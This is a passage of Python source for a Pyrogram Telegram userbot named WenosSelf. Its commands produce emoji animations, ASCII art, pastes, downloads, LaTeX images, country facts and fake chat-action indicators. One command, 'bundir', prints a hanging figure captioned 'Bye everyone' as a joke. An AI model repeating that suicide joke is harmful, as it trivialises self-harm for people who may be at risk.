    await asyncio.sleep(1)
    await e.edit("🐢                       🚶")
    await e.edit("🐢                      🚶")
    await e.edit("🐢                     🚶")
    await e.edit("🐢                    🚶")
    await e.edit("🐢                   🚶")
    await e.edit("🐢                  🚶")
    await e.edit("🐢                 🚶")
    await e.edit("🐢                🚶")
    await e.edit("🐢               🚶")
    await e.edit("🐢              🚶")
    await e.edit("🐢             🚶")
    await e.edit("🐢            🚶")
    await e.edit("🐢           🚶")
    await e.edit("🐢          🚶")
    await e.edit("🐢         🚶")
    await e.edit("🐢        🚶")
    await e.edit("🐢       🚶")
    await e.edit("🐢      🚶")
    await e.edit("🐢     🚶")
    await e.edit("🐢    🚶")
    await e.edit("🐢   🚶")
    await e.edit("🐢  🚶")
    await e.edit("🐢 🚶")
    await e.edit("🐢🚶")
    await asyncio.sleep(1)
    await e.edit("🚶🐢")
    await e.edit("🚶 🐢")
    await e.edit("🚶  🐢")
    await e.edit("🚶   🐢")
    await e.edit("🚶    🐢")
    await e.edit("🚶     🐢")
    await e.edit("🚶      🐢")
    await e.edit("🚶       🐢")
    await e.edit("🚶        🐢")
    await e.edit("🚶         🐢")
    await e.edit("🚶          🐢")
    await e.edit("🚶           🐢")
    await e.edit("🚶            🐢")
    await e.edit("🚶             🐢")
    await e.edit("🚶              🐢")
    await e.edit("🚶               🐢")
    await e.edit("🚶                🐢")
    await e.edit("🚶                 🐢")
    await e.edit("🚶                  🐢")
    await e.edit("🚶                   🐢")
    await e.edit("🚶                    ??")
    await e.edit("🚶                     🐢")
    await e.edit("🚶                      🐢")
    await e.edit("🚶                       🐢")
    await e.edit("🚶                        🐢")
    await e.edit("🚶                         🐢")
    await e.edit("🚶                          🐢")
    await e.edit("🚶                           🐢")
    await e.edit("🚶                            🐢")
    await e.edit("🚶                             🐢")
    await e.edit("🚶                              🐢")
    await e.edit("🚶                               🐢")
    await e.edit("🚶                                🐢")
    await e.edit("`GABUT`")


@app.on_message(filters.command(["helikopter", "heli"], ".") & filters.me)
async def helikopter(app, message: Message):
    await edit_or_reply(
        message,
        "▬▬▬.◙.▬▬▬ \n"
        "═▂▄▄▓▄▄▂ \n"
        "◢◤ █▀▀████▄▄▄▄◢◤ \n"
        "█▄ █ █▄ ███▀▀▀▀▀▀▀╬ \n"
        "◥█████◤ \n"
        "══╩══╩══ \n"
        "╬═╬ \n"
        "╬═╬ \n"
        "╬═╬ \n"
        "╬═╬ \n"
        "╬═╬ \n"
        "╬═╬ \n"
        "╬═╬ Hallo Semuanya :) \n"
        "╬═╬☻/ \n"
        "╬═╬/▌ \n"
        "╬═╬/ \\ \n",
    )


@app.on_message(filters.command("tembak", ".") & filters.me)
async def dornembak(app, message: Message):
    await edit_or_reply(
        message,
        "_/﹋\\_\n" "(҂`_´)\n" "<,︻╦╤─ ҉\n" r"_/﹋\_" "\n**Mau Jadi Pacarku Gak?!**",
    )


@app.on_message(filters.command("bundir", ".") & filters.me)
async def ngebundir(app, message: Message):
    await edit_or_reply(
        message,
        "`Dadah Semuanya...`          \n　　　　　|"
        "\n　　　　　| \n"
        "　　　　　| \n"
        "　　　　　| \n"
        "　　　　　| \n"
        "　　　　　| \n"
        "　　　　　| \n"
        "　　　　　| \n"
        "　／￣￣＼| \n"
        "＜ ´･ 　　 |＼ \n"
        "　|　３　 | 丶＼ \n"
        "＜ 、･　　|　　＼ \n"
        "　＼＿＿／∪ _ ∪) \n"
        "　　　　　 Ｕ Ｕ\n",
    )


@app.on_message(filters.command(["awk", "awikwok"], ".") & filters.me)
async def awikwok(app, message: Message):
    await edit_or_reply(
        message,
        "────██──────▀▀▀██\n"
        "──▄▀█▄▄▄─────▄▀█▄▄▄\n"
        "▄▀──█▄▄──────█─█▄▄\n"
        "─▄▄▄▀──▀▄───▄▄▄▀──▀▄\n"
        "─▀───────▀▀─▀───────▀▀\n`Awkwokwokwok..`",
    )


@app.on_message(filters.command("y", ".") & filters.me)
async def ysaja(app, message: Message):
    await edit_or_reply(
        message,
        "‡‡‡‡‡‡‡‡‡‡‡‡▄▄▄▄\n"
        "‡‡‡‡‡‡‡‡‡‡‡█‡‡‡‡█\n"
        "‡‡‡‡‡‡‡‡‡‡‡█‡‡‡‡█\n"
        "‡‡‡‡‡‡‡‡‡‡█‡‡‡‡‡█\n"
        "‡‡‡‡‡‡‡‡‡█‡‡‡‡‡‡█\n"
        "██████▄▄█‡‡‡‡‡‡████████▄\n"
        "▓▓▓▓▓▓█‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡█\n"
        "▓▓▓▓▓▓█‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡█\n"
        "▓▓▓▓▓▓█‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡█\n"
        "▓▓▓▓▓▓█‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡█\n"
        "▓▓▓▓▓▓█‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡█\n"
        "▓▓▓▓▓▓█████‡‡‡‡‡‡‡‡‡‡‡‡██\n"
        "█████‡‡‡‡‡‡‡██████████\n",
    )


@app.on_message(filters.command("tank", ".") & filters.me)
async def tank(app, message: Message):
    await edit_or_reply(
        message,
        "█۞███████]▄▄▄▄▄▄▄▄▄▄▃ \n"
        "▂▄▅█████████▅▄▃▂…\n"
        "[███████████████████]\n"
        "◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤\n",
    )


@app.on_message(filters.command("babi", ".") & filters.me)
async def babi(app, message: Message):
    await edit_or_reply(
        message,
        "┈┈┏━╮╭━┓┈╭━━━━╮\n"
        "┈┈┃┏┗┛┓┃╭┫Best Self ┃\n"
        "┈┈╰┓▋▋┏╯╯╰━━━━╯\n"
        "┈╭━┻╮╲┗━━━━╮╭╮┈\n"
        "┈┃▎▎┃╲╲╲╲╲╲┣━╯┈\n"
        "┈╰━┳┻▅╯╲╲╲╲┃┈┈┈\n"
        "┈┈┈╰━┳┓┏┳┓┏╯┈┈┈\n"
        "┈┈┈┈┈┗┻┛┗┻┛┈┈┈┈\n",
    )


@app.on_message(filters.command(["ajg", "anjg"], ".") & filters.me)
async def anjg(app, message: Message):
    await edit_or_reply(
        message,
        "╥━━━━━━━━╭━━╮━━┳\n"
        "╢╭╮╭━━━━━┫┃▋▋━▅┣\n"
        "╢┃╰┫┈┈┈┈┈┃┃┈┈╰┫┣\n"
        "╢╰━┫┈┈┈┈┈╰╯╰┳━╯┣\n"
        "╢┊┊┃┏┳┳━━┓┏┳┫┊┊┣\n"
        "╨━━┗┛┗┛━━┗┛┗┛━━┻\n",
    )


@app.on_message(filters.command("nah", ".") & filters.me)
async def nahlove(app, message: Message):
    typew = await edit_or_reply(
        message, "`\n(\\_/)`" "`\n(●_●)`" "`\n />💖 *Ini Buat Kamu`"
    )
    await asyncio.sleep(2)
    await typew.edit("`\n(\\_/)`" "`\n(●_●)`" "`\n💖<\\  *Tapi Bo'ong`")


@app.on_message(filters.command("santet", ".") & filters.me)
async def santet(app, message: Message):
    typew = await edit_or_reply(message, "`Mengaktifkan Perintah Santet Online....`")
    await asyncio.sleep(2)
    await typew.edit("`Mencari Nama Orang Ini...`")
    await asyncio.sleep(1)
    await typew.edit("`Santet Online Segera Dilakukan`")
    await asyncio.sleep(1)
    await typew.edit("0%")
    number = 1
    await typew.edit(str(number) + "%   ▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   █████████████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ██████████████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████████▊")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ███████████████▉")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████████")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████████▎")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████████▍")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████████▌")
    number += 1
    await asyncio.sleep(0.03)
    await typew.edit(str(number) + "%   ████████████████▌")
    await asyncio.sleep(1)
    await typew.edit("**Target Berhasil Tersantet Online 🥴**")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
@app.on_message(filters.command(["love"], ".") & filters.me)
async def hearts(app, message: Message):
    await phase1(message)
    await asyncio.sleep(SLEEP * 3)
    await message.edit("❤️ I")
    await asyncio.sleep(0.5)
    await message.edit("❤️ I Love")
    await asyncio.sleep(0.5)
    await message.edit("❤️ I Love You")
    await asyncio.sleep(3)
    await message.edit("❤️ I Love You <3")
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(
    filters.command(["neko", "nekobin", "bin", "paste"], ".") & filters.me
)
async def paste(app, message: Message):
    text = message.reply_to_message.text
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                    "https://nekobin.com/api/documents", json={"content": text}, timeout=3
            ) as response:
                key = (await response.json())["result"]["key"]
    except Exception:
        await message.edit_text("`Pasting failed`")
        await asyncio.sleep(2)
        await message.delete()
        return
    else:
        url = f"https://nekobin.com/{key}"
        reply_text = f"Nekofied to **Nekobin** : {url}"
        delete = (
            True
            if len(message.command) > 1
               and message.command[1] in ["d", "del"]
               and message.reply_to_message.from_user.is_self
            else False
        )
        if delete:
            await asyncio.gather(
                bot.send_message(
                    message.chat.id, reply_text, disable_web_page_preview=True
                ),
                message.reply_to_message.delete(),
                message.delete(),
            )
        else:
            await message.edit_text(
                reply_text,
                disable_web_page_preview=True,
            )
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["rename"], ".") & filters.me)
def rename(_, message):
        filename = message.text.replace(message.text.split(" ")[0], "")
        reply = message.reply_to_message
        x = message.reply_text("Downloading.....")
        path = reply.download(file_name=filename)
        x.edit("Uploading.....")
        message.reply_document(path)
        os.remove(path)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["lad"], ".") & filters.me)
async def ladder(app, message):
    orig_text = message.text.split(None, 1)[1]
    text = orig_text
    output = []
    for i in range(len(text) + 1):
        output.append(text[:i])
    ot = "\n".join(output)
    await app.send_message(message.chat.id,ot, reply_to_message_id=message.id)
    
@app.on_message(filters.command(["del"], ".") & filters.me)
async def delete_messages(app, message):
    if message.reply_to_message:
        message_id = message.reply_to_message.id
        await app.delete_messages(message.chat.id, message_id)
    await message.delete()
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["down"], ".") & filters.me)
async def instag(app, message: Message):
    link = message.text.split(None, 1)[1]
    bot = "saveasbot"
    if link:
        try:
            xnxx = await app.send_message(bot, link)
            await asyncio.sleep(5)
            await xnxx.delete()
        except YouBlockedUser:
            await app.unblock_user(bot)
            xnxx = await app.send_message(bot, link)
            await asyncio.sleep(5)
            await xnxx.delete()
    async for instag in app.search_messages(
        bot, filter=enums.MessagesFilter.VIDEO, limit=1
    ):
        await app.edit_message_text(chat_id=message.chat.id , text=f'.down `{link}`' , message_id=message.id)
        await asyncio.gather(
            app.send_video(
                message.chat.id,
                instag.video.file_id,
                reply_to_message_id=message.id,
                caption="**Done!**\nby WenosSelf"
            ),
        )
        await app.delete_messages(bot, 2)
        
@app.on_message(filters.command(["down2"], ".") & filters.me)
async def sosmed(client: Client, message: Message):
    link = message.text.split(None, 1)[1]
    bot = "thisvidbot"
    if link:
        try:
            xnxx = await app.send_message(bot, link)
            await asyncio.sleep(5)
            await xnxx.delete()
        except YouBlockedUser:
            await app.unblock_user(bot)
            xnxx = await app.send_message(bot, link)
            await asyncio.sleep(5)
            await xnxx.delete()
    async for sosmed in app.search_messages(
        bot, filter=enums.MessagesFilter.VIDEO, limit=1
    ):
        await asyncio.gather(
            app.send_video(
                message.chat.id,
                sosmed.video.file_id,
                reply_to_message_id=message.id,
                caption="**Done!**\nby WenosSelf"
            ),
        )
        await app.delete_messages(bot, 2)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command("shutdown", ".") & filters.me)
async def shutdown_bot(app, message: Message):
        await app.send_message(
            message.chat.id,
            "**#SHUTDOWN** \n"
            "**WenosSelf** IS OFF!\nSend message to sup @U3erZX for running again!",reply_to_message_id=message.id,
        )
        sys.exit(0)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["latex"], ".") & filters.me)
async def latex(client, message):
        import urllib.parse
        escaped_text = urllib.parse.quote("\dpi{1000}" + message.text[1+5+1:])
        try:
            r = requests.get("https://latex.codecogs.com/png.image?" + escaped_text).content
            with Image.open(BytesIO(r)) as im:
                bordered_image = ImageOps.expand(im, border=50, fill=(255, 255, 255))
                
                output = BytesIO()
                bordered_image.save(output, format='PNG')

                await message.reply_photo(photo=output)
        except Exception as e:
            print(e)
            await message.reply(f"Error: <code>{e}</code>")
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["country"], ".") & filters.me)
async def country_(app, m: Message):
    msg_ = await app.send_message(m.chat.id, "**Searching For Country.....**")
    lol = m.text.split(".country")[1].strip()
    try:
        country = CountryInfo(lol)
        a = country.info()
        name = a.get("name")
        bb = a.get("altSpellings")
        hu = "".join(p + ",  " for p in bb)
        area = a.get("area")
        hell = a.get("borders")
        borders = "".join(fk + ",  " for fk in hell)
        WhAt = a.get("callingCodes")
        call = "".join(what + "  " for what in WhAt)
        capital = a.get("capital")
        fker = a.get("currencies")
        currencies = "".join(FKer + ",  " for FKer in fker)
        HmM = a.get("demonym")
        geo = a.get("geoJSON")
        pablo = geo.get("features")
        Pablo = pablo[0]
        PAblo = Pablo.get("geometry")
        EsCoBaR = PAblo.get("type")
        iso = ""
        iSo = a.get("ISO")
        for hitler in iSo:
            po = iSo.get(hitler)
            iso += po + ",  "
        fla = iSo.get("alpha2")
        nox = fla.upper()
        languages = a.get("languages")
        lMAO = "".join(lmao + ",  " for lmao in languages)
        nonive = a.get("nativeName")
        waste = a.get("population")
        reg = a.get("region")
        sub = a.get("subregion")
        tik = a.get("timezones")
        tom = "".join(jerry + ",   " for jerry in tik)
        GOT = a.get("tld")
        lanester = "".join(targaryen + ",   " for targaryen in GOT)
        wiki = a.get("wiki")
        caption = f"""**Country**▬▬▬▬▬▬▬▬▬▬
<b><u>information gathered successfully</u></b>
<b>
Country Name:- {name}
Alternative Spellings:- {hu}
Country Area:- {area} square kilometers
Borders:- {borders}
Calling Codes:- {call}
Country's Capital:- {capital}
Country's currency:- {currencies}
Demonym:- {HmM}
Country Type:- {EsCoBaR}
ISO Names:- {iso}
Languages:- {lMAO}
Native Name:- {nonive}
Population:- {waste}
Region:- {reg}
Subregion:- {sub}
Time Zones:- {tom}
Top Level Domain:- {lanester}
Wikipedia:- {wiki}</b>
<u><b>
Information Gathered By WenosSelf.
"""
        await app.send_message(m.chat.id ,caption, disable_web_page_preview=True, reply_to_message_id=m.id)
    except KeyError:
        await msg_.edit("Invalid country name.")
#^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
@app.on_message(filters.me, group=31)
async def modes(app , message):

    if message.text == ".playing on":
        with open("playing.txt", "w") as file:
            file.write("on")
        await app.edit_message_text(chat_id=message.chat.id , text='playing action is on' , message_id=message.id)

    if message.text == ".playing off":
        with open("playing.txt", "w") as file:
            file.write("off")
        await app.edit_message_text(chat_id=message.chat.id , text='playing action is off' , message_id=message.id)

    if message.text == ".typing on":
        with open("typing.txt", "w") as file:
            file.write("on")
        await app.edit_message_text(chat_id=message.chat.id , text='typing action is on' , message_id=message.id)

    if message.text == ".typing off":
        with open("typing.txt", "w") as file:
            file.write("off")
        await app.edit_message_text(chat_id=message.chat.id , text='typing action is off' , message_id=message.id)

    if message.text == ".record_vid on":
        with open("RECORD_VIDEO.txt", "w") as file:
            file.write("on")
        await app.edit_message_text(chat_id=message.chat.id , text='RECORD_VIDEO action is on' , message_id=message.id)

    if message.text == ".record_vid off":
        with open("RECORD_VIDEO.txt", "w") as file:
            file.write("off")
        await app.edit_message_text(chat_id=message.chat.id , text='RECORD_VIDEO action is off' , message_id=message.id)

    if message.text == ".choose_sticker on":
        with open("CHOOSE_STICKER.txt", "w") as file:
            file.write("on")
        await app.edit_message_text(chat_id=message.chat.id , text='CHOOSE_STICKER action is on' , message_id=message.id)

    if message.text == ".choose_sticker off":
        with open("CHOOSE_STICKER.txt", "w") as file:
            file.write("off")
        await app.edit_message_text(chat_id=message.chat.id , text='CHOOSE_STICKER action is off' , message_id=message.id)

    if message.text == ".upload_vid on":
        with open("UPLOAD_VIDEO.txt", "w") as file:
            file.write("on")
        await app.edit_message_text(chat_id=message.chat.id , text='UPLOAD_VIDEO action is on' , message_id=message.id)

    if message.text == ".upload_vid off":
        with open("UPLOAD_VIDEO.txt", "w") as file:
            file.write("off")
        await app.edit_message_text(chat_id=message.chat.id , text='UPLOAD_VIDEO action is off' , message_id=message.id)

    if message.text == ".upload_doc on":
        with open("UPLOAD_DOCUMENT.txt", "w") as file:
            file.write("on")
        await app.edit_message_text(chat_id=message.chat.id , text='UPLOAD_DOCUMENT action is on' , message_id=message.id)

    if message.text == ".uoload_doc off":
        with open("UPLOAD_DOCUMENT.txt", "w") as file:
            file.write("off")
        await app.edit_message_text(chat_id=message.chat.id , text='UPLOAD_DOCUMENT action is off' , message_id=message.id)

    if message.text == ".upload_audio on":
        with open("UPLOAD_AUDIO.txt", "w") as file:
            file.write("on")
        await app.edit_message_text(chat_id=message.chat.id , text='UPLOAD_AUDIO action is on' , message_id=message.id)

    if message.text == ".upload_audio off":
        with open("UPLOAD_AUDIO.txt", "w") as file:
            file.write("off")
        await app.edit_message_text(chat_id=message.chat.id , text='UPLOAD_AUDIO action is off' , message_id=message.id)

    if message.text == ".speaking on":
        with open("SPEAKING.txt", "w") as file:
            file.write("on")
        await app.edit_message_text(chat_id=message.chat.id , text='SPEAKING action is on' , message_id=message.id)

    if message.text == ".speaking off":
        with open("SPEAKING.txt", "w") as file:
            file.write("off")
        await app.edit_message_text(chat_id=message.chat.id , text='SPEAKING action is off' , message_id=message.id)
@app.on_message(~filters.me & ((filters.private & ~filters.bot) | (filters.mentioned & filters.group)))       
async def Actions(app , message):

        with open("playing.txt", "r") as file2:
            playing = file2.read()

        with open("typing.txt", "r") as file2:
            typing = file2.read()

        with open("RECORD_VIDEO.txt", "r") as file2:
            RECORD_VIDEO = file2.read()

        with open("CHOOSE_STICKER.txt", "r") as file2:
            CHOOSE_STICKER = file2.read()

        with open("UPLOAD_VIDEO.txt", "r") as file2:
            UPLOAD_VIDEO = file2.read()

        with open("UPLOAD_DOCUMENT.txt", "r") as file2:
            UPLOAD_DOCUMENT = file2.read()

        with open("UPLOAD_AUDIO.txt", "r") as file2:
            UPLOAD_AUDIO = file2.read()

        with open("SPEAKING.txt", "r") as file2:
            SPEAKING = file2.read()

        if playing == "on" :
            await app.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.PLAYING)

        if typing == "on" :
            await app.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.TYPING)

        if RECORD_VIDEO == "on" :
            await app.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.RECORD_VIDEO)

        if CHOOSE_STICKER == "on" :
            await app.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.CHOOSE_STICKER)

        if UPLOAD_VIDEO == "on" :
            await app.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.UPLOAD_VIDEO)

        if UPLOAD_DOCUMENT == "on" :
            await app.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.UPLOAD_DOCUMENT)

        if UPLOAD_AUDIO == "on" :
            await app.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.UPLOAD_AUDIO)

        if SPEAKING == "on" :
            await app.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.SPEAKING)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.linked_channel)
def first(app, m:Message):
 chat_id , text = m.chat.id , m.text
 a = json_read("data.json")
 if a["firstcom"] == "on":
  msgr = read("firstcommentmsg.txt").split(":")
  if text != "@ultra_self":
    if msgr[0] == "text":
       m.reply(msgr[1])
    elif msgr[0] == "sticker":
       m.reply_sticker(msgr[1])
    elif msgr[0] == "animation":
       m.reply_animation(msgr[1])
    else:
       m.reply("__ERROR:__\nMessage Not Set\n**WenosSelf**")


#_________________________Mute Mode___________________________________
def fbky(_ , __ , m:Message):
 try:
  if m.chat.id in mutey :
   return True
  else:
   return False 
 except:
  pass



